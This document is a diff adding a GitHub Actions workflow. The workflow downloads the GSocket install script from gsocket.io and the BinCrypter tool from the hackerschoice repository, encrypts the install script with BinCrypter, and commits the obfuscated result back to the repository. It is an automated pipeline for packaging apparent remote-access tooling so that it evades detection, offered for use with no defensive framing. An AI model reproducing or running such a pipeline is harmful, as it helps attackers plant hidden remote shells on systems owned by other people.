@@ -1,0 +1,34 @@
+name: Encrypt and Commit GSocket Install Script
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  encrypt_and_commit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Download GSocket Install Script
+        run: wget -O gsocket-install.sh https://gsocket.io/y
+
+      - name: Download BinCrypter
+        run: wget -O bincrypter.sh https://raw.githubusercontent.com/hackerschoice/bincrypter/refs/heads/main/bincrypter.sh
+
+      - name: Set execute permissions on BinCrypter
+        run: chmod +x bincrypter.sh
+
+      - name: Encrypt GSocket Install Script
+        run: ./bincrypter.sh gsocket-install.sh
+
+      - name: Commit encrypted script
+        run: |
+          git config --global user.name "github-actions"
+          git config --global user.email "github-actions@github.com"
+          git add gsocket-install.sh.bin
+          git commit -m "Add encrypted gsocket-install.sh"
+          git push
